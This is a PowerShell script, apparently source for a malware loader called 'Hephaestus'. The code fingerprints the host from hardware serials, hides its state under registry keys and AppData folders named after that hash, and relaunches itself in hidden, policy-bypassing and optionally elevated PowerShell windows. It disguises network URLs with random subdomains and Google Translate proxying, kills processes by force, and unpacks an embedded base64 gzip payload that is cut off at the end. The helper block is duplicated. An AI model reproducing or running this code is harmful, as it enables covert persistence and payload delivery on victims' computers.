function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}



###head
function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$machineCode = ""

function Get-MachineCode {

    if ([string]::IsNullOrEmpty($machineCode) -eq $false)
    {
        return $machineCode
    }
    try {
        $biosSerial = (Get-WmiObject Win32_BIOS).SerialNumber
        $mbSerial = (Get-WmiObject Win32_BaseBoard).SerialNumber
        $macAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled }).MACAddress[0]
    
        $combinedString = "$biosSerial$mbSerial$macAddress"
    
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($combinedString)
        $hashBytes = $sha256.ComputeHash($bytes)
    
        # Convert to Base64 and take the first 12 characters
        $hashString = [Convert]::ToBase64String($hashBytes) -replace "[^a-zA-Z0-9]", ""  # Remove non-alphanumeric characters
        
        $machineCode = $hashString.Substring(0, 12)
    }
    catch 
    {
        $machineCode = "Hephaestus"
    }
    return $machineCode
}

$hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"

$globalDebug = IsDebug;

function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )
    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)

        $memoryStream = New-Object System.IO.MemoryStream(,$decodedBytes)
        $gzipStream = New-Object System.IO.Compression.GZipStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)
        $outputStream = New-Object System.IO.MemoryStream

        $gzipStream.CopyTo($outputStream)
        $gzipStream.Close()
        $memoryStream.Close()

        [System.IO.File]::WriteAllBytes($outFile, $outputStream.ToArray())
    }
    catch {
        writedbg "Failed to decode to file $outFile and decompress: $_"
    }
}

function Get-SHA256HashBase64 {
    param ([string]$inputString)
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $byteArray = [System.Text.Encoding]::UTF8.GetBytes($inputString)
    $hashBytes = $sha256.ComputeHash($byteArray)
    return [Convert]::ToBase64String($hashBytes)
}

function CustomDecodeEnveloped {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $parsed = $inContent | ConvertFrom-Json
    $evalHash = Get-SHA256HashBase64($parsed.json)
    if ($evalHash -ne $parsed.hash)
    {
        throw "Wrong Hash";
    }
    return CustomDecode -inContent $parsed.json -outFile $outFile
}

function EnvelopeIt {
    param ([string]$inputString)
    
    $hash = Get-SHA256HashBase64 -inputString $inputString
    
    $envelope = @{
        json = $inputString
        hash = $hash
    }
    
    return ($envelope | ConvertTo-Json)
}

function ModifyUrl {
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    

    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
    }
    else
    {
        $domainParts = @(Get-RandomString) + $domainParts
    }
    $newHost = ($domainParts -join '.')
    
    $newQuery = $uri.Query
    $randomArg = "xxx=" + (Get-RandomString)
    
    if ($newQuery) {
        if ($newQuery.StartsWith('?')) {
            $newQuery = "?" + $randomArg + "&" + $newQuery.Substring(1)
        }
    } else {
        $newQuery = "?" + $randomArg
    }
    
    if ($uri.Port -ne 80 -and $uri.Port -ne 443) {
        $newUrl = $uri.Scheme + "://" + $newHost + ":" + $uri.Port + $uri.AbsolutePath + $newQuery
    } else {
        $newUrl = $uri.Scheme + "://" + $newHost + $uri.AbsolutePath + $newQuery
    }
    
    return $newUrl
}

function GoogleUrl{
    param ([string]$url)
    
    $uri = [System.Uri]$url
    $domainParts = $uri.Host.Split('.')
    
    if ($domainParts.Length -gt 2) {
        $newHost = $domainParts[0] + '-' + $domainParts[1] + '-' + $domainParts[2]
    } else {
        $newHost = $domainParts[0] + '-' + $domainParts[1]
    }

    $newUrl = "https://" + $newHost + ".translate.goog" + $uri.AbsolutePath + "?_x_tr_sch=http&_x_tr_sl=en&_x_tr_tl=ja&_x_tr_hl=ru&_x_tr_pto=wapp"
    
    return $newUrl
}


function Get-RandomString {
    $length = 8
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $randomString = -join ((0..($length-1)) | ForEach-Object { $characters[(Get-Random -Minimum 0 -Maximum $characters.Length)] })
    return $randomString
}


function SmartServerlUrl{
    param ([string]$url)
         $url = ModifyUrl -url $url
         return $url
}


function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath $($(Get-MachineCode))
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = (Get-MachineCode) + '_b.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function GetArg {
    param ([string]$arg)

    $globalArgs = $global:args
    $arg = $arg.ToLower()

    for ($i = 0; $i -lt $globalArgs.Count; $i++) {
        $currentArg = $globalArgs[$i].TrimStart("-").ToLower()
        if ( (ArgsEqual $currentArg $arg) -and $i + 1 -lt $globalArgs.Count) {
            return $globalArgs[$i + 1]
        }
    }

    return ""
}

function StrToInt {
    param ([string]$value)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return 0
    }

    $intValue = 0
    if ([int]::TryParse($value, [ref]$intValue)) {
        return $intValue
    }

    return 0
}

function StrToBool {
    param ([string]$value, [bool]$default)

    if ([string]::IsNullOrWhiteSpace($value)) {
        return $default
    }

    $boolValue = $default
    if ([bool]::TryParse($value.ToLower(), [ref]$boolValue)) {
        return $boolValue
    }

    return $default
}

function RegWrite {
    param (
        [string]$registryPath,
        [string]$keyName,
        [string]$value
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $value) {
                writedbg "The '$keyName' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $value
                writedbg "'$keyName' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value "$value" -PropertyType String -Force | Out-Null
            writedbg "'$keyName' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the '$keyName' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function RegWriteInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )

    RegWrite -registryPath $registryPath -keyName $keyName -value $value.ToString()
}

function RegRead {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue
            $res = $currentValue.$keyName
            if ($null -eq $res)
            {
                $res = "";
            }
            return $res
        }
    } catch {
        writedbg "Error reading registry key '$keyName' from '$registryPath': $($_.Exception.Message)" -ForegroundColor Red
    }

    return ""
}

function RegReadInt {
    param (
        [string]$registryPath,
        [string]$keyName
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToInt -value $value
}

function RegReadBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$default
    )

    $value = RegRead -registryPath $registryPath -keyName $keyName
    return StrToBool -value $value -default $default
}

function RegWriteParam {
    param (
        [string]$keyName,
        [string]$value
    )
    $registryPath = $hepaestusReg
    RegWrite -registryPath $registryPath -keyName $keyName -value $value
}

function RegWriteParamInt {
    param (
        [string]$registryPath,
        [string]$keyName,
        [int]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString()
}

function RegWriteParamBool {
    param (
        [string]$registryPath,
        [string]$keyName,
        [bool]$value
    )
    RegWriteParam -keyName $keyName -value $value.ToString().ToLower()
}

function RegReadParam {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegRead -registryPath $registryPath -keyName $keyName
}

function RegReadParamInt {
    param (
        [string]$keyName
    )
    $registryPath = $hepaestusReg
    return RegReadInt -registryPath $registryPath -keyName $keyName
}

function RegReadParamBool {
    param (
        [string]$keyName,        [bool]$default
    )
    $registryPath = $hepaestusReg
    return RegReadBool -registryPath $registryPath -keyName $keyName -default $default
}

function GetArgInt {
    param ([string]$arg)

    return StrToInt (GetArg $arg)
}

function EnsureDashPrefix {
    param ([string]$value)

    if (-not $value.StartsWith("-")) {
        return "-" + $value
    }
    return $value
}

function ArgsEqual {
    param (
        [string]$arg1,
        [string]$arg2
    )

    # Normalize both arguments (remove leading "-" and compare case-insensitively)
    $normalizedArg1 = $arg1.TrimStart("-").ToLower()
    $normalizedArg2 = $arg2.TrimStart("-").ToLower()

    return $normalizedArg1 -eq $normalizedArg2
}

function RunMe {
    param (
        [string]$script, 
        [bool] $repassArgs,
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    $argName = EnsureDashPrefix -value $argName

    $scriptPath = $script
    
    $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
    
    if ($repassArgs -eq $true) {
        $globalArgs = $global:args
        $filteredArgs = @()
        $skipNext = $false

        for ($i = 0; $i -lt $globalArgs.Count; $i++) {
            if ($skipNext) 
            {
                $skipNext = $false
                continue
            }

            if (ArgsEqual $globalArgs[$i] $argName) {
                $skipNext = $true
                continue
            }

            $filteredArgs += $globalArgs[$i]
        }
        $globalArgs = $filteredArgs
        $local += $globalArgs
        if (-not [string]::IsNullOrEmpty($argName) -and $argName -ne "-") {
            $local += $argName
            $local += $argValue
        }
    }

    $argumentList = ""
    for ($i = 0; $i -lt $local.Count; $i += 1) {
        $arg = $local[$i]
        $argumentList += "$arg "
    }

    writedbg "starting  $argumentList"

    if ($globalDebug)
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Normal -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Normal -ArgumentList $argumentList
        }
    }
    else 
    {
        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }

}

function IsElevatedOld
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}

function IsElevated {
    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}




$xbody = "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